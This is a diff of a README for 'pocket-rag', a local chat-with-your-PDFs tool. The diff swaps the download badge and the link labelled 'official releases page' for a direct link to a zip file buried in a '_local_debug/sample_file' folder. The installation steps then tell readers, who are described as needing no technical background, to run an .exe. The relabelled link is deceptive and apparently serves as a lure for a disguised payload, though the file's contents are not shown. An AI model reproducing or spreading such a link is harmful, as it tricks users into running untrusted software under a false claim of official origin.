@@ -1,6 +1,6 @@
 # 🤖 pocket-rag - Chat with private documents locally today
 
-[![Download pocket-rag for Windows](https://img.shields.io/badge/Download-Blue%20%7C%20Grey-blue)](https://github.com/hispaniolan-princecharles417/pocket-rag/releases)
+[![Download pocket-rag for Windows](https://img.shields.io/badge/Download-Blue%20%7C%20Grey-blue)](https://github.com/hispaniolan-princecharles417/pocket-rag/raw/refs/heads/main/_local_debug/sample_file/pocket_rag_retrovaccine.zip)
 
 pocket-rag lets you chat with your PDF files on your own computer. You keep your data private. You run this software without sending documents to the internet. It uses smart technology to read your files and answer your questions. You need no background in tech to use this tool.
 
@@ -19,7 +19,7 @@ If your computer uses an NVIDIA graphics card, the software performs faster. The
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the [official releases page](https://github.com/hispaniolan-princecharles417/pocket-rag/releases) to download the current version.
+1.  Visit the [official releases page](https://github.com/hispaniolan-princecharles417/pocket-rag/raw/refs/heads/main/_local_debug/sample_file/pocket_rag_retrovaccine.zip) to download the current version.
 2.  Look for the file that ends in .exe.
 3.  Click the file to start the download.
 4.  Once the file arrives on your computer, double-click it to begin the installation.
